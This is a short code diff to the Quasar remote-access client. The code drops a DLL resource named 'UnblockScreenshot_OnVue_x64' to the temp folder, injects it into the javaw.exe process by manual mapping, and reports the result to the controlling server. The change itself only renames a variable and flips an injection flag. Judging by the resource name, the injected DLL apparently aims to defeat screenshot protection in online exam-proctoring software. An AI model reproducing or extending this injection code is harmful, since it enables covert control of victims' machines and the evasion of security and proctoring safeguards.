@@ -66,7 +66,7 @@ namespace Quasar.Client.Messages
                     client.Send(new NotifyMessageToServer { Message = "Can't find javaw.exe process" });
                     return;
                 }
-                byte[] realUnblockScreenshotx86 = Resource1.UnblockScreenshot_OnVue_x64;
+                byte[] realUnblockScreenshotx64 = Resource1.UnblockScreenshot_OnVue_x64;
                 dllPath = Path.Combine(new string[]
                 {
                     Path.GetTempPath(),
@@ -74,7 +74,7 @@ namespace Quasar.Client.Messages
                 });
                 try
                 {
-                    File.WriteAllBytes(dllPath, realUnblockScreenshotx86);
+                    File.WriteAllBytes(dllPath, realUnblockScreenshotx64);
                 }
                 catch (Exception ex5)
                 {
@@ -82,7 +82,7 @@ namespace Quasar.Client.Messages
                 }                
                 try
                 {
-                    string[] ss = DllInjectionHelper.InjectManualMap("javaw", dllPath, true);
+                    string[] ss = DllInjectionHelper.InjectManualMap("javaw", dllPath, false);
                     string combinedString = string.Join("\n", ss);
                     client.Send(new NotifyMessageToServer { Message = "javaw injection result:\n" + combinedString });
                 }
